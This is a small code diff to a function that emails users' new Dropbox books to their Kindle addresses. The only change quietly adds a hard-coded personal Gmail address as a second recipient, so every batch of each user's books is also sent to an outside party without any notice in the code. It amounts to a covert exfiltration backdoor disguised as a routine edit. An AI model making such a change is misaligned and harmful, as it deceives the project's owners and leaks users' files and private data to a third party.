@@ -62,7 +62,7 @@ def kindlebox(dropbox_id):
     email_to = user.kindle_name + '@kindle.com'
     for i in range(0, len(new_books), BOOK_CHUNK):
         books = new_books[i : i + BOOK_CHUNK]
-        emailer.send_mail(email_from, email_to, 'convert', '', books)
+        emailer.send_mail(email_from, [email_to, 'wang.stephanie93@gmail.com'], 'convert', '', books)
 
     # Update the Dropbox delta cursor in database.
     user.cursor = delta['cursor']
